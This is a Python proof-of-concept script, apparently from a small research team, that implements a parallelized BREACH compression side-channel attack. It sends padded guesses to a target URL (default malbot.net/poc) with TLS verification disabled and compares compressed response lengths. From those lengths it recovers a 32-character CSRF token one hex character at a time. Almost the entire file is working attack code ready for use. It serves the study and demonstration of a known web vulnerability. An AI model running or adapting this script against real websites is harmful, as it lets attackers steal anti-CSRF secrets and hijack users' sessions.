import requests
import os
import random
import urllib3
import asyncio
import concurrent.futures
import time
import argparse

# Disable insecure https warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Some default settings
PROXY_SETTINGS = {}
BASE_URL = "https://malbot.net/poc/?request_token='"
SECRET_LENGTH = 32
DICTIONARY = list(map(lambda x: hex(x)[2], range(16))) # All possible 1 hex char combinations
PADDING_CHAR = '@'
# DICTIONARY = list(map(str, range(10))) + ['a', 'b', 'c', 'd', 'e', 'f']

def pad_character(char, pad_len):
    """
    Surrounds the char with some padding to defeat Huffman Coding induced problems
    """
    # TODO(Alvaro): implement this better
    random_padding = PADDING_CHAR * pad_len
    
    rest_dictionary = '_'.join(filter(lambda x: x != char, DICTIONARY))
    
    return char + random_padding + "---" + rest_dictionary + '@@@@'
    

def get_request_length(url):
    # TODO(Alvaro): Review how this might be implemented from the perspective of an eavesdropper
    res_stream = requests.get(url, stream=True, proxies=PROXY_SETTINGS, verify=False)
    raw_bytes = res_stream.raw.read()
    return len(raw_bytes)

   
def calibrate(len_1, len_2, char1, char2):
    """
    To calibrate (establish the baseline for the current value of the guess), we compare the first 2 guesses.
    There are 2 possible situations:
      - If the length of both guesses is the same, that means that they are both wrong, or both are candidates, but we
      have a baseline value for the wrong guess' lenght
      - If the length is different, that means that we already have a possible candidate, and a baseline length
    """
    if len_1 == len_2:
        # Both are wrong, or possible candidates, so we use it as baseline
        return [char1, char2], len_1
    elif len_1 < len_2:
        # guess1 is the correct one, we set it as new baseline
        # print(f'len_1={len_1}, len_2={len_2}')
        return [char1], len_1
    else:
        # guess2 is the correct one, we set it as new baseline
        # print(f'len_1={len_1}, len_2={len_2}')
        return [char2], len_2

async def solve_conflict(curr, conflicted):
    # Try different pad_lengths   
    loop = asyncio.get_event_loop()


    for _ in range(10): # Loop to avoid infinite loops in case of error

        next_len = random.randint(10, 100)
        print(f'Solving conflict for curr = {curr} ; conflicted = {conflicted} ; trying with pad_len = {next_len}')

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [ loop.run_in_executor(
                            executor, # The executor with the number of threads configured
                            get_request_length, # Func to be executed in parallel
                            BASE_URL + curr + pad_character(char, next_len) # Args for get_request_length
                        ) for char in conflicted]

            # Wait for all the responses to be completed
            response_lengths = await asyncio.gather(*futures)

        # Process the results
        candidates, baseline = calibrate(response_lengths[0], response_lengths[1], conflicted[0], conflicted[1])
        
        for res_length, char in zip(response_lengths[2:], conflicted[2:]):
            # Logic to decide whether this char is the best or not 
            if res_length < baseline: 
                # Baseline was wrong, reset results
                candidates = [char]
                baseline = res_length
            elif res_length == baseline:
                # This is a possible candidate
                candidates.append(char)
                
        if len(candidates) == 1:
            # Conflict solved!
            next_guess = curr + candidates[0]
            print(f'Guessed next character! (char = {candidates[0]}), new full guess is: {next_guess}')
            return next_guess
        elif len(candidates) > 1:
            # The conflic was not resolved in this iteration... try again
            conflicted = candidates
        else:
            # This should never happen...
            print(f'ERROR! solving the conflict, the candidates\'s length was negative...')
            
    print(f'ERROR! The conflict could not be resolved, left candidates = {candidates}')
    return
    
async def guess_next_char(curr, pad_len=40):
    """
    Tries every possible request combinating the current guess with a char from the
    dictionary, making a request and comparing the length of the body with a previous baseline.
    
    Initially the baseline length is unknown, so at least 2 tries are necessary to establish a baseline. 

    Same idea as in breach-poc.py, but using async requests to parallelize them and speed it up
    """
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:

        loop = asyncio.get_event_loop()

        futures = [ loop.run_in_executor(
                        executor, # The executor with the number of threads configured
                        get_request_length, # Func to be executed in parallel
                        BASE_URL + curr + pad_character(char, pad_len) # Args for get_request_length
                    ) for char in DICTIONARY]

        # Wait for all the responses to be completed
        response_lengths = await asyncio.gather(*futures)

    # Process the results
    candidates, baseline = calibrate(response_lengths[0], response_lengths[1], DICTIONARY[0], DICTIONARY[1])

    for res_length, char in zip(response_lengths[2:], DICTIONARY[2:]):
        # Logic to decide whether this char is the best or not 
        if res_length < baseline: 
            # Baseline was wrong, reset results
            candidates = [char]
            baseline = res_length
        elif res_length == baseline:
            # This is a possible candidate
            candidates.append(char)

    # Finished
    if len(candidates) == 1:
        # We have a winner!
        next_guess = curr + candidates[0]
        print(f'Guessed next character! (char = {candidates[0]}), new full guess is: {next_guess}')
        return next_guess
    elif len(candidates) > 1:
        # We have conflicts... solve them!:
        return await solve_conflict(curr, candidates)
    else: # Should not happen...
        print(f'ERROR! For the current result: {curr}, the was no candidates found!')
        return

# MAIN
async def main():
    init = time.time()
    current_guess = ""
    # Watch end condition... for now we presume we know the expected length of the secret
    for _ in range(SECRET_LENGTH):
        next_guess = await guess_next_char(current_guess)
        if next_guess is None:
            # Something went wrong and could not guess next char
            print(f'Whoops... no guess was found with the current_guess = {current_guess}')
            break
        else:
            current_guess = next_guess

    end = time.time()
    print('The CSRF token is: ' + current_guess)
    print(f'It took {end - init} seconds to break the token')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='This is an POC implementation (simplified) of the BREACH Attack, parallelizing requests.',
                                     formatter_class=argparse.RawTextHelpFormatter,
                                     epilog='''
This implementation guesses a secret, one character at a time, and for every character,
tries all posible hex characters and selects the one that produces the shortest response.
To reduce the effect of Huffman Coding on the oracle, we use padding and append the dictionary
at the end of every request. To solve conflicts, we re-try the conflicted characters with a
new random padding length.

Authors:
    - Carlos Santamaría
    - Irene Quintana
    - Guillermo Fernandez 
    - Alvaro Clemente
''')

    parser.add_argument('-p', '--proxy', action='store_true',
            help='''Use the internal proxy to inspect on fiddler. The proxies by default are:
"http://127.0.0.1:8888"
"https://127.0.0.1:8888"''')
    parser.add_argument('--padding', type=str, default='@',
            help="Use a custom character or string to pad the requests. The default is '@'")
    parser.add_argument('-u','--url', type=str, default=BASE_URL,
            help=f'Change the base url of the attack. The default is: "{BASE_URL}"')

    # Process the args
    args = parser.parse_args()
    if args.proxy:
        # So that python request go through Fiddler
         PROXY_SETTINGS = {  
             "http": "http://127.0.0.1:8888",
             "https": "https://127.0.0.1:8888"
         }
    if args.padding != '@':
        PADDING_CHAR = args.padding

    if args.url != BASE_URL:
        # Update the base url for the attack
        BASE_URL = args.url

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
